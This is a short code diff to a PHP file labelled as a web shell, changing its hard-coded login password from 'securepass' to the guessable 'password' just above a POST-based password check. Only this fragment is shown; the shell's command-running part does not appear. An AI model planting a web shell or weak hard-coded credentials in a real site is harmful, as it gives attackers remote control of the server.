@@ -3,7 +3,7 @@
 // PHP Web Shell
 
 // Password protection
-$password = 'securepass'; // Change this to your desired password
+$password = 'password'; // Change this to your desired password
 
 // Authentication check
 if (isset($_POST['password']) && $_POST['password'] === $password) {
